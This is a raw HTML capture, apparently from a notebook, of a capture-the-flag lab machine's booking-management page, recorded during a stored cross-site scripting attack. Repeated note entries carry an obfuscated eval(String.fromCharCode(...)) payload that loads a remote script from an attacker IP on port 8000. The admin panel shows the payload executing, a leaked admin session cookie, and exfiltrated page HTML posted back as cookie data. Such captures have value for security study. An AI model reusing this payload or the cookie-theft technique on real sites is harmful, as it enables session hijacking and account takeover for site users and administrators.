+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>      
+                                    <small>Thursday, January 16th 2020, 1:47:16 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>      
+                                    <small>Thursday, January 16th 2020, 1:50:15 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>      
+                                    <small>Thursday, January 16th 2020, 1:53:40 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>      
+                                    <small>Thursday, January 16th 2020, 1:58:32 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>      
+                                    <small>Thursday, January 16th 2020, 2:01:59 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>      
+                                    <small>Thursday, January 16th 2020, 2:02:56 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>                     
+                                    <small>Thursday, January 16th 2020, 2:05:56 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>                     
+                                    <small>Thursday, January 16th 2020, 2:11:59 pm</small><br/>                                                                  
+                              <h2>Add note</h2>                                 
+                              <form class="form" action="/agent/addNote" method="post">                                                                          
+                                <input type="hidden" name="uuid" value="8dd841ff-3f44-4f2b-9324-9a833e2c6b65">                                                   
+                                <textarea class="form-control" name="body"></textarea><br/>                                                                      
+                                <button class="btn btn-md btn-primary btn-block" type="submit">Add</button>                                                      
+                              </form>   
+                              <br/>     
+                              <i>All notes must be approved by an administrator - this process can take up to 1 minute.</i>                                      
+                            </div>      
+                          </div>        
+                        </div>          
+                        <div role="tabpanel" class="tab-pane" id="admin">       
+                          <div class="panel panel-default">                     
+                            <div class="panel-body">                            
+                                <h2>Notes awaiting approval</h2>                
+                                    <hr/>                                       
+                                    <img src=x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>><br/><br/>       
+                                    <small>Thursday, January 16th 2020, 2:14:16 pm</small><br/>                                                                  
+                                    <form action="/admin/approve" method="POST">                                                                                 
+                                      <input type="hidden" name="cookie" value="connect.sid&#x3D;s%3A94586010-386a-11ea-a7b0-0fc7ba4d9c73.3vt4UJZtNbLeWVAGhEpJbGJIYA%2B8htQ3V2HzfLZRpmY">                
+                                      <input type="hidden" name="id" value="14">                                                                                 
+                                      <button class="button" type="submit">Approve</button>                                                                      
+                                    </form>                                     
+                                    <hr/>                                       
+                                    cookie=%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%20%20%3Chead%3E%0A%20%20%20%20%20%20%3Cmeta%20charset%3D%22utf-8%22%3E%0A%20%20%20%20%20%20%3Cmeta    
+%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%3E%0A%20%20%20%20%20%20%3Ctitle%3EBooking%20Management%3C%2Ftitle%3E%0A%20%20%20%20%20%20%3Cmet
+a%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20minimum-scale%3D1.0%2C%20maximum-scale%3D1.0%22%3E%0A%20%20%20%20%20%20%3Clink%20rel%3D%22styl
+esheet%22%20type%3D%22text%2Fcss%22%20href%3D%22%2Fcss%2Fbootstrap.min.css%22%20%2F%3E%0A%20%20%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcs
+s%22%20href%3D%22%2Fcss%2Fmain.min.css%22%20%2F%3E%0A%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fjs%2Fjquery.min.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%20%20%3Cscr
+ipt%20src%3D%22%2Fjs%2Fbootstrap.min.js%22%3E%3C%2Fscript%3E%0A%20%20%3C%2Fhead%3E%0A%0A%20%20%3Cbody%3E%0A%20%20%20%20%20%20%3Cdiv%20id%3D%22st-container%22%20c
+lass%3D%22st-container%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22st-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3Cp%3E%0A%20%20%20%20%20%20%20%20%20%20%20
+%20%20%20%3Cnav%20class%3D%22navbar%20navbar-inverse%20navbar-static-top%20hidden-print%22%20role%3D%22navigation%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20
+%20%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22navbar-brand%20navbar-hx
+-logo%22%20href%3D%22http%3A%2F%2Fholiday.htb%22%20data-hxtrack-name%3D%22navbar-logo%22%3EBooking%20Management%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%
+20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22nav%20navbar-nav%20navbar-right%20pull-right%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
+%20%20%20%20%20%20%3Cli%20class%3D%22dropdown%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22
+%23%22%20class%3D%22dropdown-toggle%20text-right%22%20data-hxtrack-name%3D%22navbar-phone-numbers%22%20data-toggle%3D%22dropdown%22%3E%3Cspan%20class%3D%22hidden
+-xs%22%3E%3Ci%20class%3D%22fa%20fa-phone%22%3E%3C%2Fi%3E%20Freephone%200800%20111%204645%3C%2Fspan%3E%3Cspan%20class%3D%22visible-xs%22%3EContact%20us%3C%2Fspan%
+3E%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22dropdown-menu%20navbar-phone-numbers
+%20text-right%22%3<br/><br/>            
+                                    <small>Thursday, January 16th 2020, 2:14:38 pm</small><br/>                                                                  
+                                    <form action="/admin/approve" method="POST">                                                                                 
+                                      <input type="hidden" name="cookie" value="connect.sid&#x3D;s%3A94586010-386a-11ea-a7b0-0fc7ba4d9c73.3vt4UJZtNbLeWVAGhEpJbGJIYA%2B8htQ3V2HzfLZRpmY">                
+                                      <input type="hidden" name="id" value="15">                                                                                 
+                                      <button class="button" type="submit">Approve</button>                                                                      
+                                    </form>                                     
+                            </div>      
+                          </div>        
+                        </div>          
+                  </div>                
+              </div>                    
+
+
+          </main>                       
+
+      </div>                            
+  </div>                                
+
+
+  </body>                               
+</html>                                 
+
+
+In [7]:                                 
